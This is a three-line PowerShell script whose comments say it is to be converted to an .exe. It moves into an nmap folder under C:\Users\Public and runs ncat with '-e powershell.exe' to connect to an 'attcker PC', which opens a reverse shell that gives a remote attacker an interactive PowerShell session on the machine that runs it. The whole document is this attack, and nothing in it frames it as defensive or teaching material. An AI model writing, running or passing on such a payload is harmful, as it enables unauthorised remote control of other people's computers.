#This script has to be converted to .exe file
Set-Location 'C:\Users\Public\Documents\nmap\nmap-7.92' #Go to netcat directory
./ncat IP PORT -e powershell.exe #Connect to attcker PC
